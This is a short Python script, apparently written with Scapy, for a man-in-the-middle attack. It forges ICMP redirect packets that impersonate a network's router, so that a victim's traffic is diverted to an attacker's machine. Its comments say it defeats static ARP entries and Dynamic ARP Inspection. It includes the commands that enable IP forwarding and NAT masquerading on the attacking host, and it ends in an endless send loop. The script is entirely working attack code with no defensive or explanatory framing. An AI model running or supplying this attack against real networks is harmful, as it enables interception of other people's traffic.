# MitM against:
#  - static ARP entries
#  - Dynamic ARP inspection

# Prerequisites:
# echo 1 > /proc/sys/net/ipv4/ip_forward
# iptables -t nat -A POSTROUTING -s 10.100.13.0/255.255.255.0 -o tap0 -j MASQUERADE

# Creating and sending ICMP redirect packets between these entities:
originalRouterIP=''
attackerIP=''
victimIP=''
serverIP=''

# Here we create an ICMP Redirect packet
ip=IP()
ip.src=originalRouterIP
ip.dst=victimIP
icmpRedirect=ICMP()
icmpRedirect.type=5
icmpRedirect.code=1
icmpRedirect.gw=attackerIP

# The ICMP packet payload /should/ :) contain the original TCP SYN packet
# sent from the victimIP
redirPayloadIP=IP()
redirPayloadIP.src=victimIP
redirPayloadIP.dst=serverIP
fakeOriginalTCPSYN=TCP()
fakeOriginalTCPSYN.flags="S"
fakeOriginalTCPSYN.dport=80
fakeOriginalTCPSYN.seq=444444444
fakeOriginalTCPSYN.sport=55555

# Release the Kraken!
while True:
    send(ip/icmpRedirect/redirPayloadIP/fakeOriginalTCPSYN)
